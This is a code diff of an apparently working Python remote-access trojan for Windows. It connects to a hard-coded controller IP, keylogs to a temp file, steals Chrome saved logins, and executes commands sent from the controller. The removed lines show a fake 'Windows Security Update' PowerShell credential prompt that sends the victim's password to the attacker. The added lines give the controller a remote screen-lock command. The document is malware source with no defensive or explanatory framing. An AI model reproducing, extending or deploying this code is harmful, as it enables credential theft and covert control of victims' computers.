@@ -4,27 +4,17 @@ from PIL import ImageGrab
 from os import getenv  
 import sqlite3, win32crypt, socket, subprocess, os, tempfile 
 import shutil, threading, win32api, pythoncom, random         
-import numpy, sys, pyHook, shutil, cv2, time
+import numpy, sys, pyHook, shutil, cv2, time, ctypes
 
+ImagePath = tempfile.mkdtemp()
 keyLog = tempfile.mkdtemp()
 f_name = keyLog+"\log.txt"
-ip_address = '192.168.10.11'
+ip_address = '192.168.10.12'
 
-def askPass(s):
-    while True:
-        try:
-            command = "powershell $cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password;"
-            cmd = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-            cmd_output, errors = cmd.communicate()
-            if cmd_output != '':
-                if len(cmd_output) == 2:
-                    pass
-                else:
-                    s.send("Victim's Password: "+cmd_output)
-                    break
-        except:
-            s.send('ERROR')
-    
+def lockScreen():
+    ctypes.windll.user32.LockWorkStation()
+
+
 def get_chrome_path(s):
     try:
         path = getenv("LOCALAPPDATA")  + "\Google\Chrome\User Data\Default\Login Data"
@@ -201,6 +191,9 @@ def connect():
                 shutil.rmtree(path)
             else:
                 s.send("[!] Chrome Doesn't exists")
+        elif 'lockScreen' in command:
+            lockScreen()
+            s.send( "[+] Victim Screen Lock")
         elif 'cd' in command:
             code,directory = command.split (' ')
             os.chdir(directory)
@@ -222,3 +215,15 @@ def main ():
 
 if __name__ == "__main__":
     main()
+
+
+
+
+
+
+
+
+
+
+
+
